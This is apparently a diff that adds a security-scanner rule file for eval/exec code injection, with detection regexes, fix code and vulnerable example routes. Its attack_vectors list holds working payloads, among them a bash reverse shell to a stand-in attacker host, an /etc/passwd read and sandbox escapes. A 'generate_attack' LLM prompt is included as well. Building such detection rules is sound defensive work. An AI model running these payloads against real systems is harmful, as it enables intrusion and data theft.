@@ -1,0 +1,272 @@
+id: eval-injection
+name: Eval/Exec Code Injection
+category: injection
+severity: critical
+cwe: CWE-95
+owasp: A03:2021-Injection (Code Injection)
+
+description: |
+  Eval/exec code injection occurs when untrusted user input is passed to code execution functions
+  (eval, exec, compile, __import__, etc.), allowing attackers to execute arbitrary code.
+
+references:
+  - https://owasp.org/www-community/attacks/Code_Injection
+  - https://cwe.mitre.org/data/definitions/95.html
+
+affected_languages:
+  - python
+  - javascript
+  - typescript
+  - php
+
+affected_frameworks:
+  - flask
+  - django
+  - fastapi
+  - express
+  - nestjs
+
+vulnerability_types:
+  - eval() usage
+  - exec() usage
+  - compile() usage
+  - Function constructor
+  - setTimeout/setInterval with string argument
+  - Dynamic import with user input
+
+detection:
+  static:
+    - pattern: "eval\\(.*request\\..*\\)"
+      description: eval() function with user input
+      confidence: critical
+      requires_language: [python]
+
+    - pattern: "exec\\(.*request\\..*\\)"
+      description: exec() function with user input
+      confidence: critical
+      requires_language: [python]
+
+    - pattern: "compile\\(.*request\\..*\\)"
+      description: compile() function with user input
+      confidence: critical
+      requires_language: [python]
+
+    - pattern: "__import__\\(.*request\\..*\\)"
+      description: Dynamic import with user input
+      confidence: critical
+      requires_language: [python]
+
+    - pattern: "\\[\\s*[\"']exec[\"']\\s*\\]\\(.*\\)"
+      description: Dictionary-based exec lookup with user input
+      confidence: high
+      requires_language: [python]
+
+    - pattern: "getattr\\(builtins|__builtins__,\\s*['\"]exec['\"]\\)"
+      description: getattr to access exec function
+      confidence: high
+      requires_language: [python]
+
+    - pattern: "new Function\\(.*req\\..*\\)"
+      description: Function constructor with user input
+      confidence: critical
+      requires_language: [javascript, typescript]
+
+    - pattern: "eval\\(.*req\\..*\\)"
+      description: eval() with user input
+      confidence: critical
+      requires_language: [javascript, typescript]
+
+    - pattern: "setTimeout\\(.*req\\..*\\)"
+      description: setTimeout with string argument
+      confidence: high
+      requires_language: [javascript, typescript]
+
+    - pattern: "setInterval\\(.*req\\..*\\)"
+      description: setInterval with string argument
+      confidence: high
+      requires_language: [javascript, typescript]
+
+  data_flow:
+    - source: "request.(json|form|args|values|body|params|query)"
+      sink: "(eval|exec|compile|__import__|Function|setTimeout|setInterval)"
+      sanitizers:
+        - "(safe|validate|sanitize|restricted|allow)"
+
+remediation:
+  description: Never pass untrusted input to code execution functions
+
+  code_before: |
+    @app.route('/calculate')
+    def calculate():
+      expression = request.args.get('expr')
+      result = eval(expression)
+      return str(result)
+
+  code_after: |
+    import ast
+    import operator
+
+    SAFE_OPERATORS = {
+        ast.Add: operator.add,
+        ast.Sub: operator.sub,
+        ast.Mult: operator.mul,
+        ast.Div: operator.truediv,
+        ast.Pow: operator.pow,
+    }
+
+    def safe_eval(node):
+        if isinstance(node, ast.Constant):
+            return node.value
+        elif isinstance(node, ast.BinOp):
+            op = SAFE_OPERATORS.get(type(node.op))
+            if not op:
+                raise ValueError("Unsupported operation")
+            left = safe_eval(node.left)
+            right = safe_eval(node.right)
+            return op(left, right)
+        else:
+            raise ValueError("Unsupported expression")
+
+    @app.route('/calculate')
+    def calculate():
+      expression = request.args.get('expr')
+      tree = ast.parse(expression, mode='eval')
+      result = safe_eval(tree.body)
+      return str(result)
+
+  code_after_library: |
+    import simpleeval
+
+    @app.route('/calculate')
+    def calculate():
+      expression = request.args.get('expr')
+      result = simpleeval.simple_eval(expression)
+      return str(result)
+
+examples:
+  vulnerable:
+    - |
+      @app.route('/eval')
+      def evaluate():
+          code = request.args.get('code')
+          result = eval(code)
+          return str(result)
+
+    - |
+      @app.route('/execute')
+      def execute():
+          command = request.form.get('cmd')
+          exec(command)
+          return "Executed"
+
+    - |
+      @app.route('/template')
+      def render_template():
+          template = request.args.get('tpl')
+          return eval(f"f'{template}'")
+
+    - |
+      @app.route('/dynamic-import')
+      def dynamic_import():
+          module = request.args.get('module')
+          __import__(module)
+          return "Imported"
+
+    - |
+      @app.route('/obfuscated-exec')
+      def obfuscated():
+          code = request.args.get('code')
+          __builtins__['exec'](code)
+          return "Executed"
+
+    - |
+      @app.route('/attribute-access')
+      def attribute():
+          func = request.args.get('func')
+          getattr(__builtins__, func)()
+          return "Done"
+
+  secure:
+    - |
+      import ast
+
+      @app.route('/calculate')
+      def calculate():
+          expression = request.args.get('expr', '')
+          if not re.match(r'^[\d+\-*/(). ]+$', expression):
+              return "Invalid expression", 400
+          try:
+              tree = ast.parse(expression, mode='eval')
+              result = safe_eval(tree.body)
+              return str(result)
+          except Exception:
+              return "Calculation error", 400
+
+    - |
+      ALLOWED_MODULES = {'math', 'random'}
+
+      @app.route('/calculate')
+      def calculate():
+          expression = request.args.get('expr')
+          # Use safe evaluation library
+          from simpleeval import simpleeval
+          result = simpleeval(expression, names={'math': __import__('math')})
+          return str(result)
+
+attack_vectors:
+  - vector: "Code Execution"
+    payload: "__import__('os').system('id')"
+    description: Execute shell commands through Python eval
+
+  - vector: "Data Exfiltration"
+    payload: "open('/etc/passwd').read()"
+    description: Read sensitive files
+
+  - vector: "Reverse Shell"
+    payload: "__import__('os').popen('bash -i >& /dev/tcp/attacker/4444 0>&1').read()"
+    description: Establish reverse shell
+
+  - vector: "Python Import Bypass"
+    payload: "__import__('subprocess').call(['ls', '-la'])"
+    description: Execute commands through subprocess module
+
+  - vector: "String Manipulation"
+    payload: "''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['system']('ls')"
+    description: Access system through string methods
+
+  - vector: "Module Access"
+    payload: "().__class__.__bases__[0].__subclasses__()[144].__init__.__globals__['system']('id')"
+    description: Access forbidden modules through object attributes
+
+security_recommendations:
+  - Never use eval() or exec() with user input
+  - Use safe evaluation libraries (simpleeval, ast.literal_eval)
+  - Implement strict input validation
+  - Use allow-lists for safe operations
+  - Disable dangerous built-ins if using restricted execution
+  - Consider using sandboxed execution environments if necessary
+  - Use proper parsing libraries instead of eval
+
+llm_prompts:
+  analyze: |
+    Analyze this code for eval/exec injection vulnerabilities. Look for:
+    1. eval() calls with user input
+    2. exec() calls with user input
+    3. compile() calls with user input
+    4. Dynamic __import__ with user input
+    5. Function constructor with user input
+    6. Indirect access to code execution (getattr, __builtins__)
+    7. Obfuscated execution patterns
+
+    For each finding:
+    - Identify the specific vulnerability
+    - Explain the potential for arbitrary code execution
+    - Provide secure implementation
+
+  generate_attack: |
+    Generate an eval injection attack for this vulnerable calculator endpoint. The attack should:
+    1. Execute arbitrary Python code
+    2. Read /etc/passwd
+    3. Execute shell command (whoami)
+    4. Use obfuscation to bypass basic filters
+    5. Demonstrate multiple attack vectors
